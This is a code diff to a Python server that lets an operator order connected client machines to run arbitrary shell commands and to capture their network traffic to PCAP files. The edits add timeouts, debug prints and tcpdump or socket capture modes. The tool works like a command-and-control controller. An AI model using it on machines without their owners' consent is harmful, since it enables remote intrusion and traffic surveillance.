@@ -10,7 +10,7 @@ clients = {}
 clients_lock = threading.Lock()
 clients_file = "clients.json"
 
-HOST_IP = "192.168.0.1"
+HOST_IP = "192.168.2.7"
 PORT = 5000
 
 def listener():
@@ -57,25 +57,50 @@ def client_handler(client_socket, command_queue, client_id):
     try:
         while True:
             if not command_queue.empty():
-                command = command_queuinfoe.get()
+                command = command_queue.get()
                 client_socket.send(command.encode())
+                timeout = False
                 if command.startswith("CAPTURE"):
                     header, initial_data = receive_header(client_socket)
+                    print(f"recieved header {header}")
                     if header.startswith("PCAP"):
                         size = int(header.split()[1])  # Extract size from "PCAP <size>"
+                        print(size)
                         pcap_data = b""
+                        counter = 0
+                        
                         while len(pcap_data) < size:
-                            chunk = client_socket.recv(min(4096, size - len(pcap_data)))
-                            if not chunk:
+                            counter += 1
+                            
+                            print(f"RUN {counter}: len before capture {len(pcap_data)}")
+                            client_socket.settimeout(10)  # 10 seconds
+                            try:
+                                chunk = client_socket.recv(min(4096, size - len(pcap_data)))
+                            except socket.timeout:
+                                print(f"Timeout waiting for {size - len(pcap_data)} bytes")
+                                timeout=True
                                 break
+                            
+                            if not chunk:
+                                print("Connection closed by client")
+                                break
+                            
                             pcap_data += chunk
-                        hostname = clients[client_id]["info"]["hostname"]
-                        timestamp = time.strftime("%Y%m%d_%H%M%S")
-                        filename = f"./pcaps/{hostname}_{timestamp}.pcap"
-                        os.makedirs("./pcaps", exist_ok=True)
-                        with open(filename, "wb") as f:
-                            f.write(pcap_data)
-                        print(f"PCAP saved to {filename}")
+                            print(f"RUN {counter}: len after capture {len(pcap_data)}")
+                            print(f"RUN {counter}: expected to recieve {size - len(pcap_data)}")
+                            
+                        if timeout == False:   
+                            print("Data recieved")
+                                
+                            hostname = clients[client_id]["info"]["hostname"]
+                            timestamp = time.strftime("%Y-%m-%d_%H:%M:%S")
+                            filename = f"./pcaps/{hostname}_{timestamp}.pcap"
+                            os.makedirs("./pcaps", exist_ok=True)
+                            with open(filename, "wb") as f:
+                                f.write(pcap_data)
+                                print("data is written")
+                            print(f"PCAP saved to {filename}")
+                        
                 elif command.startswith("EXECUTE"):
                     # Receive command output
                     response = client_socket.recv(1024).decode()
@@ -83,13 +108,25 @@ def client_handler(client_socket, command_queue, client_id):
                         size = int(response.split()[1])
                         output = b""
                         while len(output) < size:
-                            chunk = client_socket.recv(min(4096, size - len(output)))
+                            client_socket.settimeout(10)  # 10 seconds
+                            try:
+                                chunk = client_socket.recv(min(4096, size - len(output)))
+                            except socket.timeout:
+                                print(f"Timeout waiting for {size - len(output)} bytes")
+                                timeout=True
+                                break
+                            
                             if not chunk:
                                 break
+                            
                             output += chunk
-                        print(f"Output from client {client_id}:\n{output.decode()}")
+                        if timeout == False:
+                            print(f"Output from client {client_id}:\n{output.decode()}")
+                    
+                        
+                        
     except Exception as e:
-        print(f"Client {client_id} disconnected: {e}")
+        print(f"Client {client_id} disconnected bruh: {e}")
         with clients_lock:
             if client_id in clients:
                 del clients[client_id]
@@ -127,15 +164,25 @@ def cli():
             try:
                 parts = command.split()
                 client_id = int(parts[1])
-                duration = int(parts[2])
+                capture_type = parts[2]
+                capture_var = int(parts[3])
+                
                 with clients_lock:
                     if client_id in clients:
-                        clients[client_id]["queue"].put(f"CAPTURE {duration}\n")
-                        print(f"Requested packet capture for {duration} seconds on client {client_id}.")
+                        if capture_type == "tcp":
+                            clients[client_id]["queue"].put(f"CAPTURE TCPDUMP {capture_var}\n")
+                            print(f"Requested TCPDUMP {capture_var} packet capture on client {client_id}.")
+                            
+                        elif capture_type == "socket":
+                            clients[client_id]["queue"].put(f"CAPTURE SOCKETS {capture_var}\n")
+                            print(f"Requested SOCKET packet capture for {capture_var} seconds on client {client_id}.")
+                        else:
+                            print("Unknown capture type")
                     else:
                         print(f"Client {client_id} not found.")
             except (IndexError, ValueError):
-                print("Usage: capture <client_id> <duration>")
+                print("capture <id> <tcp/socket> <count/duration>")
+                
         elif command.startswith("execute"):
             try:
                 parts = command.split(maxsplit=2)
@@ -149,6 +196,9 @@ def cli():
                         print(f"Client {client_id} not found.")
             except IndexError:
                 print("Usage: execute <client_id> <command>")
+            except Exception as e:
+                print(f"Error in Execute: {e}")
+                
         elif command == "view_pcaps":
             if not os.path.exists("./pcaps"):
                 print("No PCAP files found.")
@@ -160,7 +210,7 @@ def cli():
             print("Shutting down server...")
             break
         else:
-            print("Commands: start, list, info <id>, capture <id> <duration>, execute <id> <command>, view_pcaps, quit")
+            print("Commands: start, list, info <id>, capture <id> <tcp/socket> <count/duration>, execute <id> <command>, view_pcaps, quit")
 
 if __name__ == "__main__":
     # Start the listener in a separate thread
